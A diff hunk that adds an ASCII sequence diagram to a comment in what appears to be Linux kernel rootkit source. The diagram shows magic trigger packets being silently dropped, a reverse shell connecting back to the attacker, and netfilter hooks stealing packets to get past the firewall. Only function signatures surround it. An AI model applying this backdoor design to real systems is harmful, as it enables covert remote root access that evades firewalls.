@@ -588,6 +588,31 @@ static unsigned int _sock_hook_nf_cb(void *priv, struct sk_buff *skb,
  *  Part of the implementation is dedicated to internal backdoors management: keeping states,
  *  data lifetime, synchronization and more.
  *
+ *  Here is a high-level diagram:
+ *  .---------------..--------------.      .---------.      .------------.         .-----------..------------------.
+ *  |Hacker bdclient||kv pre-routing|      |kv filter|      |revshell app|         |kv inet-out||kv bypass firewall|
+ *  '---------------''--------------'      '---------'      '------------'         '-----------''------------------'
+ *          |               |                   |                 |                      |               |
+ *          |send magic pkts|                   |                 |                      |               |
+ *          |-------------->|                   |                 |                      |               |
+ *          |               |                   |                 |                      |               |
+ *          |               |check match+NF_DROP|                 |                      |               |
+ *          |               |------------------>|                 |                      |               |
+ *          |               |                   |                 |                      |               |
+ *          |               |                   |init revshell app|                      |               |
+ *          |               |                   |---------------->|                      |               |
+ *          |               |                   |                 |                      |               |
+ *          |               |                   |                 |connect-back to Hacker|               |
+ *          |               |                   |                 |--------------------->|               |
+ *          |               |                   |                 |                      |               |
+ *          |               |                   |                 |                      |okfn+NF_STOLEN |
+ *          |               |                   |                 |                      |-------------->|
+ *          |               |                   |                 |                      |               |
+ *          |               |                   |   r00tshell # _ |                      |               |
+ *          |<-------------------------------------------------------------------------------------------|
+ *  .---------------..--------------.      .---------.      .------------.         .-----------..------------------.
+ *  |Hacker bdclient||kv pre-routing|      |kv filter|      |revshell app|         |kv inet-out||kv bypass firewall|
+ *  '---------------''--------------'      '---------'      '------------'         '-----------''------------------'
  */
 static unsigned int _sock_hook_nf_fw_bypass(void *priv, struct sk_buff *skb,
         const struct nf_hook_state *state) {
